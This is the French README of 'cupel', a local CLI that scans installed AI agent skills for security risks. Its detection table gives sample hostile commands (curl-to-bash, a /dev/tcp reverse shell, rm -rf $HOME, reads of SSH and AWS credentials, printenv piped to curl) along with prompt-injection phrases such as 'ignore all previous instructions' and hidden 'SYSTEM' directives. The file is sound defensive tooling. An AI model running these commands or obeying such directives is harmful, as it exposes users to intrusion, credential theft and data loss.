# Cupel

> Audit local des skills IA. Sépare le métal pur des impuretés.

[![npm](https://img.shields.io/npm/v/cupel?label=npm)](https://www.npmjs.com/package/cupel)
[![tests](https://img.shields.io/badge/tests-30%2F30-success)](packages/cli/test)
[![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)

```bash
npx cupel
```

Scanne en quelques secondes les skills installés pour **Claude Code, Cursor, Codex, Windsurf, Gemini CLI, GitHub Copilot CLI, Continue**. Détecte les prompt injections, les exfiltrations de credentials, les reverse shells, les `curl | bash`, les signatures absentes, les skills stales. **Zero network. Tout reste sur ta machine.**

---

## Pourquoi « cupel » ?

Avant que les startups inventent les scans cybersécurité, les **orfèvres** avaient déjà un outil pour distinguer le vrai or du faux. Ça s'appelle une **coupelle** — en anglais, *cupel*.

On y dépose l'échantillon de métal, on chauffe à 1000 °C, et la céramique poreuse absorbe les impuretés (plomb, scories, alliages parasites). Le métal pur reste, isolé, visible.

`cupel` fait exactement ça pour tes skills IA. Tu lances le scan, l'outil chauffe — les impuretés (prompt injection, exfiltration, reverse shells) ressortent, le pur reste lisible.

---

## Usage rapide

```bash
# Aucune installation requise
npx cupel

# Sortie JSON pour CI / pipeline
npx cupel --json

# Échec du pipeline si un skill est en tier `danger`
npx cupel --strict

# Détail complet, même sur les skills sains
npx cupel --verbose

# Cibler un dossier précis
npx cupel --path ~/.config/cursor/skills
```

Prérequis : **Node.js ≥ 22**.

---

## Ce que cupel détecte

**14 catégories** de signaux, scoring composite, tier final `ok / warn / danger` :

| Signal | Exemple |
|---|---|
| `shell_pipe_to_interpreter` | `curl https://x.io/y.sh \| bash` |
| `reverse_shell_tcp` | `/dev/tcp/10.0.0.1/4444` |
| `rm_rf_root` | `rm -rf $HOME` |
| `prompt_injection` | « ignore all previous instructions » (FR + EN) |
| `cred_file_read` | `cat ~/.ssh/id_rsa`, `~/.aws/credentials` |
| `credential_pattern` | clés AWS / Stripe / OpenAI en clair |
| `webhook_exfil` | endpoints d'exfiltration (`webhook.site`, ngrok) |
| `powershell_iwr_iex` | `iwr https://x \| iex` |
| `eval_dynamic` | `eval(atob(...))` |
| `env_dump` | `printenv \| curl` |
| **`invisible_unicode`** *(v0.2)* | zero-width chars, RTL override, Unicode Tags (ASCII smuggling) |
| **`tool_poisoning_directive`** *(v0.2)* | `<!-- SYSTEM: ... -->`, « IMPORTANT FOR ASSISTANT » |
| **`hex_escape_chain`** *(v0.2)* | `\xNN\xNN…`, `String.fromCharCode(N,N,N…)` |
| `long_base64_blob` | blob base64 > 600 chars |
| `no_manifest` | absence de SKILL.md / README.md / manifest.json |
| `unsigned` | aucune signature ed25519 / `.cupel-sig` |
| `stale` | dernière modif > 365 jours |

Les installeurs trusted (`sh.rustup.rs`, `nodejs.org`, etc.) sont reconnus et leur poids divisé par 2 — pour éviter les faux positifs sur les setups légitimes.

Code source de la détection : [`packages/cli/src/commands/doctor.ts`](packages/cli/src/commands/doctor.ts).

---

## Plateformes scannées

`cupel` détecte automatiquement les installations locales et scanne :

- `~/.claude/skills/`
- `~/.config/cursor/skills/`
- `~/.codex/skills/`
- `~/.config/windsurf/skills/`
- `~/.gemini/skills/`
- `~/.continue/skills/`
- `~/.config/github-copilot-cli/skills/`
- Le dossier courant du projet (et ses sous-dossiers `skills/`)

---

## Intégration CI/CD

Exit codes :

- `0` — aucun risque détecté (en `--strict` : tier ≠ danger)
- `1` — erreur d'exécution (chemin invalide, permissions)
- `2` — au moins un skill en tier `danger` (`--strict` activé)

### GitHub Actions + Code Scanning (depuis v0.3)

Cupel exporte au format **SARIF 2.1.0** consommé nativement par GitHub Code Scanning, GitLab Code Quality et VS Code SARIF Viewer :

```yaml
- name: Cupel — audit skills IA
  run: npx cupel --strict --sarif > cupel.sarif

- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: cupel.sarif
```

Les findings remontent dans l'onglet **Security** du repo, avec lien direct vers le code source des règles.

### Autres CI (Jenkins, CircleCI, etc.)

```bash
npx cupel --strict --json > cupel-report.json
```

---

## Audit manuel

Le CLI te dit **ce qui** cloche. Pour comprendre *pourquoi* et *comment réparer* sans casser tes workflows, un audit humain est disponible.

→ **[aissabelkoussa.fr/cupel](https://aissabelkoussa.fr/cupel)** — diagnostic 30 min gratuit, audit complet 400 € (tarif découverte, TJM normal 800 €).

---

## Roadmap

Cupel commence comme un **scanner local autonome**, mais le repo accueillera progressivement :

- `cupel scan` (présent) — audit local
- `cupel sign` (prévu) — signer ses propres skills avec ed25519
- `cupel publish` (prévu) — publier un skill signé dans une marketplace
- `cupel install` (prévu) — installer un skill vérifié depuis le marketplace
- Marketplace web (prévue) — annuaire public + control plane B2B Teams

Voir [`docs/specs/roadmap.md`](docs/specs/roadmap.md) pour le détail des phases.

Pour aujourd'hui, **seul `cupel doctor` (alias du binaire `cupel` par défaut) est production-ready**. Le reste arrivera quand la traction le justifiera.

---

## Développement

```bash
# Prérequis : Node 22+, pnpm 9+
pnpm install
pnpm --filter cupel build
pnpm --filter cupel test    # 30 tests
node packages/cli/bin/cupel.mjs --help
```

Structure (monorepo pnpm) :

```
cupel/
├── packages/
│   ├── cli/        # CLI cupel (publié sur npm)
│   ├── shared/     # @cupel/shared (types, schemas)
│   ├── security/   # @cupel/security (scan engine library)
│   └── sdk/        # @cupel/sdk (futur SDK marketplace)
├── apps/
│   └── web/        # Next.js — marketplace (en attente de traction)
├── scripts/
│   └── audit/      # outils de scan publics
└── supabase/       # backend (en attente)
```

---

## Auteur

**Aïssa BELKOUSSA** — consultant IA & dev, France
[aissabelkoussa.fr](https://aissabelkoussa.fr) · [GitHub](https://github.com/aissablk1)

## Licence

MIT — fait pour être forké, audité, amélioré.
